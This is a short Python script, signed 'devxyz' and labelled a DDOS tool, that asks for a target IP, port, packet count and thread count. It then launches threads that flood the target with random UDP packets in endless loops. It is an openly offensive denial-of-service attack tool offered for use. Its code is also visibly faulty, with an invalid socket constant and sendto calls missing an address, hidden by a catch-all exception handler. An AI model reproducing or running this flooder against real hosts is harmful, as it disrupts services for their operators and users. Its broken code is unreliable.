#codebydevxyz
import socket
import random
import threading
import os,sys

print("DDOS BY devxyz")

ip_since = str(input("Ip Target : "))
port_since = int(input("Port Target : "))
paket_since = int(input("Paket Dari since : "))
threads_since = int(input("Thread Dari since : "))
os.system("clear")

def since():
    devxyz = random._urandom(1800)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_since,port_since))
            s.sendto(devxyz)
            for x in range(paket_since):
                s.sendto(devxyz)
            print("[-] SINCE ATTACK TO IP!!!")
        except:
            print("[/] SINCE ATTACK TO IP!!!")

for y in range(threads_since):
    th = threading.Thread(target=since)
    th.start()
